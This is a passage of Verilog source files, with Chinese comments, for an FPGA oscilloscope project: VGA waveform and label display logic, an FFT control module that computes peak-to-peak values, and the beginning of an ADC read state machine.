(vga_fengzhi == 10&#x27;d25)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d498) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d506) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_24v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d24)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d498) rom_font_addr_n = 8&#x27;h20; else if(vga_x == 10&#x27;d506) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_23v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d23)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d498) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d506) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_22v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d22)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d498) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d506) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_21v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d21)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d498) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d506) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_20v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d20)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d498) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d506) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_fengzhi_0v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d0)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_pinlv_en) begin if(vga_x == 10&#x27;d130) rom_font_addr_n = 8&#x27;h60; else if(vga_x == 10&#x27;d146) rom_font_addr_n = 8&#x27;h70; else if(vga_x == 10&#x27;d162) rom_font_addr_n = 8&#x27;h80; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_fengzhi_en) begin if(vga_x == 10&#x27;d416) rom_font_addr_n = 8&#x27;ha8; else if(vga_x == 10&#x27;d432) rom_font_addr_n = 8&#x27;hb8; else if(vga_x == 10&#x27;d448) rom_font_addr_n = 8&#x27;hc8; else if(vga_x == 10&#x27;d464) rom_font_addr_n = 8&#x27;hd8; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else rom_font_addr_n &lt;= 15&#x27;b0;; end //组合电路，判断字符显示的位置并进行显示 always @ (*) begin if(vga_data_en) begin if( (vga_x &gt;= 10&#x27;d128 &amp;&amp; vga_x &lt;= 10&#x27;d704) &amp;&amp; (vga_y &gt;= 10&#x27;d96 &amp;&amp; vga_y &lt;= 10&#x27;d480) ) begin if(vga_y - 10&#x27;d97 == (ad_to_vga_data ))\t//显示波形 VGA_DATA_N = 10&#x27;d253; else if((10&#x27;d0 == (vga_y % 10&#x27;d5)) &amp;&amp; (10&#x27;d0 == (vga_x % 10&#x27;d32)))\t//画虚线 VGA_DATA_N = 10&#x27;d208; else if((10&#x27;d0 == (vga_y % 10&#x27;d32)) &amp;&amp; (10&#x27;d0 == (vga_x % 10&#x27;d5)))\t//画虚线 VGA_DATA_N = 10&#x27;d208; else if((vga_y == 10&#x27;d96 || vga_y == 10&#x27;d480) &amp;&amp; (vga_x &gt;= 10&#x27;d96 &amp;&amp; vga_x &lt;= 10&#x27;d704)) //上下线 VGA_DATA_N = 10&#x27;d208; else if((vga_x == 10&#x27;d128 || vga_x == 704) &amp;&amp; (vga_y &gt;= 96 &amp;&amp; vga_y &lt;= 480)) //左右线 VGA_DATA_N = 10&#x27;d208; else if(vga_y == 10&#x27;d352 &amp;&amp; vga_x &gt;= 10&#x27;d96 &amp;&amp; vga_x &lt;= 10&#x27;d704) //X轴 VGA_DATA_N = 10&#x27;he0; else if(vga_x == 416 &amp;&amp; vga_y &gt;= 10&#x27;d96 &amp;&amp; vga_y &lt;= 10&#x27;d480) //Y轴 VGA_DATA_N = 10&#x27;he0; else VGA_DATA_N = 8&#x27;h08; end else if(rom_5v_en)\t//在屏幕上显示5V begin if(rom_font_data[10&#x27;d106 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_4_375v_en)\t//在屏幕上显示4.375V begin if(rom_font_data[10&#x27;d138 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_3_75v_en)\t//在屏幕上显示3.75V begin if(rom_font_data[10&#x27;d170 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_3_125v_en)\t//在屏幕上显示3.125V begin if(rom_font_data[10&#x27;d202 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_2_5v_en) //在屏幕上显示2.5V begin if(rom_font_data[10&#x27;d234 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_1_875v_en) //在屏幕上显示1.875V begin if(rom_font_data[10&#x27;d266 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_1_25v_en) //在屏幕上显示1.25V begin if(rom_font_data[10&#x27;d298 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_0_625v_en) //在屏幕上显示0.625V begin if(rom_font_data[10&#x27;d330 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_0v_en) //在屏幕上显示0V begin if(rom_font_data[10&#x27;d362 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if(rom_pinlv_en) //在屏幕上显示频率两个字 begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_500hz_en) &amp;&amp; (vga_freq == 10&#x27;d500)) //在屏幕上显示500hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_333hz_en) &amp;&amp; (vga_freq == 10&#x27;d333)) //在屏幕上显示333hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_166hz_en) &amp;&amp; (vga_freq == 10&#x27;d166)) //在屏幕上显示166hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_666hz_en) &amp;&amp; (vga_freq == 10&#x27;d666)) //在屏幕上显示666hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_833hz_en) &amp;&amp; (vga_freq == 10&#x27;d833)) //在屏幕上显示833hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_1khz_en) &amp;&amp; (vga_freq == 32&#x27;d1000)) //在屏幕上显示1khz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_1166hz_en) &amp;&amp; (vga_freq == 32&#x27;d1166)) //在屏幕上显示1166hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_1333hz_en) &amp;&amp; (vga_freq == 32&#x27;d1333)) //在屏幕上显示1333hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_1500hz_en) &amp;&amp; (vga_freq == 32&#x27;d1500)) //在屏幕上显示1500hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_1666hz_en) &amp;&amp; (vga_freq == 32&#x27;d1666)) //在屏幕上显示1666hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_1833hz_en) &amp;&amp; (vga_freq == 32&#x27;d1833)) //在屏幕上显示1833hz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_2000hz_en) &amp;&amp; (vga_freq == 32&#x27;d2000)) //在屏幕上显示2khz begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_fengzhi_en)) //在屏幕上显示峰峰值3个字 begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_26v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d26)) //在屏幕上显示2.6V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_25v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d25)) //在屏幕上显示2.5V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_24v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d24)) //在屏幕上显示2.4V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_23v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d23)) //在屏幕上显示2.3V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_22v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d22)) //在屏幕上显示2.2V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_21v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d21)) //在屏幕上显示2.1V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_20v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d20)) //在屏幕上显示2.0V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else if((rom_fengzhi_0v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d0)) //在屏幕上显示0V begin if(rom_font_data[10&#x27;d506 - vga_y]) VGA_DATA_N = 10&#x27;d253; else VGA_DATA_N = 8&#x27;h03; end else VGA_DATA_N = 8&#x27;h03; end else VGA_DATA_N = 8&#x27;h0; end assign vga_x = hsync_cnt - `HSYNC_B; assign vga_y = vsync_cnt - `VSYNC_P; endmodule FFT_Control_Module.v//--------------------------------------------------------------------------- //-- 文件名 :\tFFT_Control_Module.v //-- 作者 :\tZIRCON //-- 描述 :\tFFT控制模块 //-- 修订历史\t:\t2017-01-01 //--------------------------------------------------------------------------- module FFT_Control_Module ( //输入端口 CLK_50M,RST_N,data_real_in_int, //输出端口 fft_real_out_int,fft_imag_out_int,fft_bit_cnt, ,vga_fengzhi ); //--------------------------------------------------------------------------- //-- 外部端口声明 //--------------------------------------------------------------------------- input CLK_50M; //时钟端口 input RST_N; //复位端口 input [ 9:0]\tdata_real_in_int; //输入波形数据 output [31:0] vga_fengzhi; //VGA中显示的峰峰值 output [ 9:0] fft_bit_cnt; //FFT位计数器 output [ 9:0] fft_real_out_int; //FFT实数的输出 output [ 9:0] fft_imag_out_int; //FFT虚数的输出 //--------------------------------------------------------------------------- //-- 内部端口声明 //--------------------------------------------------------------------------- wire sink_sop; //输入流的开始信号 wire sink_eop; //输入流的结束信号 wire inverse; //FFT控制信号,1:IFFT,0:FFT wire [ 1:0]\tsink_error; //输入错误信号 wire source_ready; //输出源准备信号 wire sink_ready; //输入的准备信号 wire [ 1:0]\tsource_error; //输出源的错误信号 wire source_sop; //输出源流的开始信号 wire source_eop; //输出源流的结束信号 reg end_test; //结束测试信号 reg end_test_n; //end_test的下一个状态 wire source_valid; //输出源的有效信号 wire [ 5:0]\tsource_exp; //输出源的指数信号 wire [ 9:0]\tsource_real; //输出源的实部信号 wire [ 9:0]\tsource_imag; //输出源的虚部信号 reg fft_start; //FFT开始转换信号 reg fft_start_n; //fft_start的下一个状态 wire end_input; //停止输入信号 wire end_output; //停止输出信号 reg [ 9:0]\tfft_bit_cnt; //FFT位计数器 reg [ 9:0]\tfft_bit_cnt_n; //fft_bit_cnt的下一个状态 reg [ 9:0]\tsink_real; //输入的实部信号 reg [ 9:0]\tsink_real_n; //sink_real的下一个状态 reg [ 9:0]\tsink_imag; //输入的虚部信号 reg [ 9:0]\tsink_imag_n; //sink_imag的下一个状态 reg sink_valid; //输入的有效信号 reg sink_valid_n; //sink_valid的下一个状态 reg [ 9:0] fft_real_out_int; //FFT输出的实部信号 reg [ 9:0] fft_real_out_int_n;\t//fft_real_out_int的下一个状态 reg [ 9:0]\tfft_imag_out_int; //FFT输出的虚部信号 reg [ 9:0] fft_imag_out_int_n;\t//fft_imag_out_int的下一个状态 reg [ 5:0]\texponent_out_int; //FFT输出的指数信号 reg [ 5:0]\texponent_out_int_n;\t//exponent_out_int的下一个状态 reg [31:0] fft_real_image_data;\t//FFT输出的数据信号 reg [31:0] fft_real_image_data_n;//fft_real_image_data的下一个状态 wire [15:0] sqrt_data_out; //平方根处理后的数据信号 reg [ 9:0] data_max; //数据的最大值 reg [ 9:0] data_max_n; //data_max的下一个状态 reg [ 9:0] data_max2; //数据的次大值 reg [ 9:0] data_max2_n; //data_max2的下一个状态 reg [ 9:0] max_cnt; //最大值的位置 reg [ 9:0] max_cnt_n; //max_cnt的下一个状态 reg [ 9:0] max_cnt2; //次大值的位置 reg [ 9:0] max_cnt2_n; //max_cnt2的下一个状态 reg [15:0] fengzhi_max; //峰峰值的最大值 reg [15:0] fengzhi_max_n; //fengzhi_max的下一个状态 reg [15:0] fengzhi_min; //峰峰值的最小值 reg [15:0] fengzhi_min_n; //fengzhi_min的下一个状态 parameter data_imag_in_int = 10&#x27;b0;\t//输入数据的虚部置0 parameter fftpts_array = 255; //FFT的点数 //--------------------------------------------------------------------------- //-- 逻辑功能实现 //--------------------------------------------------------------------------- /* FFT控制信号,1:IFFT,0:FFT */ assign inverse = 1&#x27;b0; /* 输入错误信号 */ assign sink_error = 2&#x27;b0; /* 源准备信号 */ assign source_ready = 1&#x27;b1; /* 输入开始进行FFT转换运算 */ assign fft_ready_valid = (sink_valid &amp;&amp; sink_ready); /* 时序电路,用来给fft_start寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) fft_start &lt;= 1&#x27;b1; else fft_start &lt;= fft_start_n; end /* 组合电路,FFT开始转换信号 */ always @ (*) begin if(fft_ready_valid) fft_start_n = 1&#x27;b0; else fft_start_n = 1&#x27;b1; end /* 时序电路,用来给fft_bit_cnt寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) fft_bit_cnt &lt;= 10&#x27;b0; else fft_bit_cnt &lt;= fft_bit_cnt_n; end /* 组合电路,FFT位计数器 */ always @ (*) begin if(fft_ready_valid &amp;&amp; (fft_bit_cnt == fftpts_array)) fft_bit_cnt_n = 1&#x27;b0; else if(fft_ready_valid) fft_bit_cnt_n = fft_bit_cnt + 1&#x27;b1; else fft_bit_cnt_n = fft_bit_cnt; end /* 停止输出信号 */ assign end_output = (source_eop &amp;&amp; source_valid &amp;&amp; source_ready) ? 1&#x27;b1 : 1&#x27;b0; /* 停止输入信号 */ assign end_input = (sink_eop &amp;&amp; sink_valid &amp;&amp; sink_ready) ? 1&#x27;b1 : 1&#x27;b0; /* 输入流的开始 */ assign sink_sop = (fft_bit_cnt == 1&#x27;b0) ? 1&#x27;b1 : 1&#x27;b0 ; /* 输入流的结束 */ assign sink_eop = (fft_bit_cnt == fftpts_array) ? 1&#x27;b1 : 1&#x27;b0; /* 时序电路,用来给end_test寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) end_test &lt;= 1&#x27;b0; else end_test &lt;= end_test_n; end /* 组合电路,结束测试信号 */ always @ (*) begin if(end_input) end_test_n = 1&#x27;b1; else end_test_n = end_test; end /* 时序电路,用来给sink_real寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) sink_real &lt;= 10&#x27;b0; else sink_real &lt;= sink_real_n; end /* 组合电路,输入的实部信号 */ always @ (*) begin if(end_test || end_input) sink_real_n = 10&#x27;b0; else if (fft_ready_valid || (fft_start &amp; !(sink_valid &amp;&amp; sink_ready == 1&#x27;b0))) sink_real_n = data_real_in_int; else sink_real_n = sink_real; end /* 时序电路,用来给sink_imag寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) sink_imag &lt;= 10&#x27;b0; else sink_imag &lt;= sink_imag_n; end /* 组合电路,输入的虚部信号 */ always @ (*) begin if(end_test || end_input) sink_imag_n = 10&#x27;b0; else if (fft_ready_valid || (fft_start &amp; !(sink_valid &amp;&amp; sink_ready == 1&#x27;b0))) sink_imag_n = data_imag_in_int; else sink_imag_n = sink_imag; end /* 时序电路,用来给sink_valid寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) sink_valid &lt;= 1&#x27;b0; else sink_valid &lt;= sink_valid_n; end /* 组合电路,输入的有效信号 */ always @ (*) begin if(end_test || end_input) sink_valid_n = 1&#x27;b0; else if (fft_ready_valid || (fft_start &amp; !(sink_valid &amp;&amp; sink_ready == 1&#x27;b0))) sink_valid_n = 1&#x27;b1; else sink_valid_n = 1&#x27;b1; end /* 时序电路,用来给fft_real_out_int寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) fft_real_out_int &lt;= 10&#x27;b0; else fft_real_out_int &lt;= fft_real_out_int_n; end /* 组合电路,FFT输出的实部信号 */ always @ (*) begin if(source_valid &amp;&amp; source_ready) fft_real_out_int_n = source_real[9] ? (~source_real[9:0]+1) : source_real; else fft_real_out_int_n = fft_real_out_int; end /* 时序电路,用来给fft_imag_out_int寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) fft_imag_out_int &lt;= 10&#x27;b0; else fft_imag_out_int &lt;= fft_imag_out_int_n; end /* 组合电路,FFT输出的虚部信号 */ always @ (*) begin if(source_valid &amp;&amp; source_ready) fft_imag_out_int_n = source_imag[9] ? (~source_imag[9:0]+1) : source_imag; else fft_imag_out_int_n = fft_imag_out_int; end /* 时序电路,用来给exponent_out_int寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) exponent_out_int &lt;= 10&#x27;b0; else exponent_out_int &lt;= exponent_out_int_n; end /* 组合电路,用于生成FFT输出的指数信号 */ always @ (*) begin if(source_valid &amp;&amp; source_ready) exponent_out_int_n = source_exp; else exponent_out_int_n = exponent_out_int; end /* 时序电路,用来给fft_real_image_data寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) fft_real_image_data &lt;= 32&#x27;b0; else fft_real_image_data &lt;= fft_real_image_data_n; end /* 组合电路,用于生成FFT输出的数据信号 */ always @ (*) begin if(source_valid &amp;&amp; source_ready) fft_real_image_data_n = fft_real_out_int*fft_real_out_int + fft_imag_out_int*fft_imag_out_int; else fft_real_image_data_n = fft_real_image_data; end /* 平方根模块 */ SQRT_Module SQRT_Init ( .radical (fft_real_image_data ),\t//FFT输出的数据信号 .q (sqrt_data_out )\t//平方根处理后的数据信号 ); /* 时序电路,用来给max_cnt2寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) max_cnt2 &lt;= 10&#x27;b0; else max_cnt2 &lt;= max_cnt2_n; end /* 组合电路,用于生成次大值的位置 */ always @ (*) begin if(sqrt_data_out &gt; data_max) max_cnt2_n = max_cnt2 + 1&#x27;b1; else if((sqrt_data_out &gt; data_max2) &amp;&amp; (sqrt_data_out != data_max)) max_cnt2_n = max_cnt2 + 1&#x27;b1; else if(max_cnt2 &gt;= 10&#x27;d256) max_cnt2_n = 10&#x27;b0; else max_cnt2_n = max_cnt2 + 1&#x27;b1;; end /* 时序电路,用来给fengzhi_max寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) fengzhi_max &lt;= 16&#x27;b0; else fengzhi_max &lt;= fengzhi_max_n; end /* 组合电路,用于生成峰峰值的最大值 */ always @ (*) begin if(data_real_in_int &gt; fengzhi_max) fengzhi_max_n = data_real_in_int; else fengzhi_max_n = fengzhi_max; end /* 时序电路,用来给fengzhi_max寄存器赋值 */ always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) fengzhi_min &lt;= 16&#x27;d255; else fengzhi_min &lt;= fengzhi_min_n; end /* 组合电路,用于求出峰峰值的最小值 */ always @ (*) begin if(fengzhi_min &gt; data_real_in_int) fengzhi_min_n = data_real_in_int; else fengzhi_min_n = fengzhi_min; end /* 组合电路,生成VGA中显示的频率值 */ /* 组合电路,生成VGA中显示的峰峰值 */ assign vga_fengzhi = ((fengzhi_max - fengzhi_min) * 10&#x27;d50) &gt;&gt; 8&#x27;d8; //((data_max3 * 10&#x27;d100) &gt;&gt; 8&#x27;d8) + 10&#x27;d2; /* FFT IP核模块例化 */ fft fft_init ( .clk (CLK_50M ), //时钟端口 .reset_n (RST_N ), //复位端口 .inverse (inverse ), //FFT控制信号,1:IFFT,0:FFT .sink_valid (sink_valid ), //输入的有效信号 .sink_sop (sink_sop ), //输入流的开始信号 .sink_eop (sink_eop ), //输入流的结束信号 .sink_real (sink_real ), //输入的实部信号 .sink_imag (sink_imag ), //输入的虚部信号 .sink_error (sink_error ), //输入错误信号 .source_ready (source_ready\t), //输出源准备信号 .sink_ready (sink_ready ), //输入的准备信号 .source_error (source_error\t), //输出源的错误信号 .source_sop (source_sop ), //输出源流的开始信号 .source_eop (source_eop ), //输出源流的结束信号 .source_valid (source_valid\t), //输出源的有效信号 .source_exp (source_exp ), //输出源的指数信号 .source_real (source_real\t), //输出源的实部信号 .source_imag (source_imag\t) //输出源的虚部信号 ); endmodule Ad_Module.v//--------------------------------------------------------------------------- //-- 文件名 :\tAd_Module.v //-- 作者 :\tZIRCON //-- 描述 :\tAD模块 //-- 修订历史\t:\t2014-1-1 //--------------------------------------------------------------------------- `define AD_CLK_TIME 10&#x27;d45\t//1.1M, 909ns,909 / (1 / 50M) = 45 =0x2D `define AD_CLK_TIME_HALF 10&#x27;d22\t//909ns / 2 = 454.5ns 45 / 2 = 22 module Ad_Module ( //Input CLK_50M,RST_N, //Output AD_CS,AD_CLK,AD_DATA,data_out ); //--------------------------------------------------------------------------- //-- 外部端口声明 //--------------------------------------------------------------------------- input CLK_50M; //时钟的端口,开发板用的50M晶振 input RST_N; //复位的端口,低电平复位 input AD_DATA; //AD数据端口 output AD_CS; //AD片选端口 output AD_CLK; //AD时钟端口，最大不超过1.1MHz output [ 7:0]\tdata_out; //AD模数转换完成的数据输出 //--------------------------------------------------------------------------- //-- 内部端口声明 //--------------------------------------------------------------------------- reg AD_CS; //AD片选信号端口 reg AD_CS_N; //AD_CS的下一个状态 reg AD_CLK; //AD时钟，最大不超过1.1MHz reg AD_CLK_N; //AD_CLK的下一个状态 reg [ 2:0]\tad_fsm_cs; //状态机的当前状态 reg [ 2:0]\tad_fsm_ns; //状态机的下一个状态 reg [ 5:0]\ttime_cnt; //用于记录一个时钟所用时间的定时器 reg [ 5:0]\ttime_cnt_n; //time_cnt的下一个状态 reg [ 5:0]\tbit_cnt; //用来记录时钟周期个数的计数器 reg [ 5:0]\tbit_cnt_n; //bit_cnt的下一个状态 reg [ 7:0]\tdata_out; //用来保存稳定的AD数据 reg [ 7:0]\tdata_out_n; //data_out的下一个状态 reg [ 7:0]\tad_data_reg; //用于保存数据的移位寄存器 reg [ 7:0]\tad_data_reg_n; //ad_data_reg_n的下一个状态 parameter FSM_IDLE = 3&#x27;h0;\t//状态机的初始状态； parameter FSM_READY = 3&#x27;h1;\t//满足CS有效时的第一个1.4us的延时状态 parameter FSM_DATA = 3&#x27;h2;\t//读取8个数据状态 parameter FSM_WAIT_CONV\t= 3&#x27;h3;\t//等待转换状态,等待17us; parameter FSM_END = 3&#x27;h4;\t//结束的状态 //--------------------------------------------------------------------------- //-- 逻辑功能实现 //--------------------------------------------------------------------------- //时序电路,用来给ad_fsm_cs寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 ad_fsm_cs &lt;= 1&#x27;b0; //初始化ad_fsm_cs值 else ad_fsm_cs &lt;= ad_fsm_ns; //用来给ad_fsm_ns赋值 end //组合电路,用来实现状态机 always @ (*) begin case(ad_fsm_cs) //判断状态机的当前状态 FSM_IDLE: //3 x 0.909us = 2.727us用于初始化延时 if((bit_cnt == 6&#x27;d2 ) &amp;&amp; (time_cnt == `AD_CLK_TIME)) ad_fsm_ns = FSM_READY;\t//如果空闲状态完成就进入延时状态 else ad_fsm_ns = ad_fsm_cs;\t//否则保持原状态不变 FSM_READY: //2 x 0.909us = 1.818us用于延迟1.4us if((bit_cnt == 6&#x27;d1 ) &amp;&amp; (time_cnt == `AD_CLK_TIME)) ad_fsm_ns = FSM_DATA;\t//如果延时状态完成就进入读取数据状态 else ad_fsm_ns = ad_fsm_cs; //否则保持原状态不变 FSM_DATA: //读取数据8位，1~8个时钟脉冲 if((bit_cnt == 6&#x27;d8 ) &amp;&amp; (time_cnt == `AD_CLK_TIME)) ad_fsm_ns = FSM_WAIT_CONV;//如果读取数据状态完成就进入等待状态 else ad_fsm_ns = ad_fsm_cs;\t//否则保持原状态不变 FSM_WAIT_CONV: //19 x 0.909us = 17.271us用于延迟17us if((bit_cnt == 6&#x27;d18) &amp;&amp; (time_cnt == `AD_CLK_TIME)) ad_fsm_ns = FSM_END; //如果等待状态完成就进入读取状态 else ad_fsm_ns = ad_fsm_cs;\t//否则保持原状态不变 FSM_END: ad_fsm_ns = FSM_READY; //完成一次数据转换,进入下一次转换 default:ad_fsm_ns = FSM_IDLE; endcase end //时序电路,用来给time_cnt寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 time_cnt &lt;= 6&#x27;h0; //初始化time_cnt值 else time_cnt &lt;= time_cnt_n; //用来给time_cnt赋值 end //组合电路,实现0.909us的定时计数器 always @ (*) begin if(time_cnt == `AD_CLK_TIME) //判断0.909us时间 time_cnt_n = 6&#x27;h0; //如果到达0.909us,定时器清零 else time_cnt_n = time_cnt + 6&#x27;h1;\t//如果未到0.909us,定时器继续加1 end //时序电路,用来给bit_cnt寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 bit_cnt &lt;= 6&#x27;h0; //初始化bit_cnt值 else bit_cnt &lt;= bit_cnt_n; //用来给bit_cnt赋值 end //组合电路,用来记录时钟周期个数的计数器 always @ (*) begin if(ad_fsm_cs != ad_fsm_ns) //判断状态机的当前状态 bit_cnt_n = 6&#x27;h0; //如果当前的状态不等于下一个状态,计时器就清零 else if(time_cnt == `AD_CLK_TIME_HALF)//判断0.4545us时间 bit_cnt_n = bit_cnt + 6&#x27;h1;\t//如果到达0.4545us,计数器就加1 else bit_cnt_n = bit_cnt; //否则计数器保持不变 end //时序电路,用来给AD_CLK寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 AD_CLK &lt;= 1&#x27;h0; //初始化AD_CLK值 else AD_CLK &lt;= AD_CLK_N; //用来给AD_CLK赋值 end //组合电路,用来生成AD的时钟波形 always @ (*) begin if(ad_fsm_cs != FSM_DATA) //判断状态机的当前状态 AD_CLK_N = 1&#x27;h0; //如果当前的状态不等于读取数据状态,AD_CLK_N就置0 else if(time_cnt == `AD_CLK_TIME_HALF)//判断0.4545us时间 AD_CLK_N = 1&#x27;h1; //如果到达0.4545us,ADC_CLK_N就置1 else if(time_cnt == `AD_CLK_TIME)//判断0.909us时间 AD_CLK_N = 1&#x27;h0; //如果到达0.909us,AD_CLK_N就置0 else AD_CLK_N = 